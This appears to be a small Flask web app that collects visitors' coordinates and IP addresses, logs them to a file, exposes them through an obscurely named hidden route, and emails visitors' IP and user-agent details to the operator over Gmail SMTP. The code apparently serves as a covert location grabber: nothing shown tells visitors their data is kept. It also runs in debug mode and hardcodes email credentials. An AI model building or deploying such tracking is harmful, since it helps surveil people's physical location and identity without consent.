from flask import Flask, render_template, request
import smtplib
rec = "reciever@gmail.com"
sen = "sneder@gmail.com"
pw = "your pass here"

app = Flask(__name__)
@app.route('/')
def indexx():
    return render_template('loc.html',x=1)
@app.route('/app')
def index():
    try:
        ad = str(request.args.get('name').split(","))
        ip = str(request.environ.get('HTTP_X_REAL_IP', request.remote_addr))
        with open('djalalon.txt','a') as f:
            f.write("\n---------------------------------<p>"+ad+'<br>'+ip+"</p>")
    except: pass
    return render_template('index.html')
@app.route('/goodbye')
def thanks():
    msg =str( request.args.get('msg') )
    ip = str(request.environ.get('HTTP_X_REAL_IP', request.remote_addr))
    uag = str(request.user_agent)
    ms = "\n".join([msg,ip,uag])
    ser = smtplib.SMTP("smtp.gmail.com",587)
    ser.starttls()
    ser.login(sen,pw)
    ser.sendmail(sen,rec,ms)
    return render_template('gb.html')
@app.route('/thisthatwhatever__some___underscores_114')
def csf():
    """
    to read the recorded coordinates
    """
    sr = "nothing"
    try:
        with open('djalalon.txt','r') as f:
            sr = f.read().split('---')
            sr = "<br>".join(sr)
    except: pass
    return sr
if __name__ == "__main__":
    app.run(debug=1)